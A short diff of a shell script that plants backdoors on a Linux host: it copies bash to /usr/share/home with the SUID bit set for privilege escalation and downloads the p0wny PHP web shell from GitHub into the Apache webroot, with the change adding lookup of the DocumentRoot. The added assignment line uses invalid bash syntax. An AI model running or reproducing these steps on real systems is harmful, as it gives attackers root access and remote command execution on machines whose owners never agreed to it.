@@ -26,7 +26,8 @@ cp /bin/bash /usr/share/home
 #ADD SUID bit for privesc
 chmod u+s /usr/share/home
 #Add Powny shell to webroot
-curl -o /var/www/html/shell.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+$webroot=`grep -i 'DocumentRoot' /etc/apache2/sites-available/000-default.conf | sed 's/DocumentRoot //'`
+curl -o $webroot/shell.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
 if [[ `ps -acx|grep httpd|wc -l` > 0 ]]; then
     echo "VM Configured with Apache"
     service httpd restart
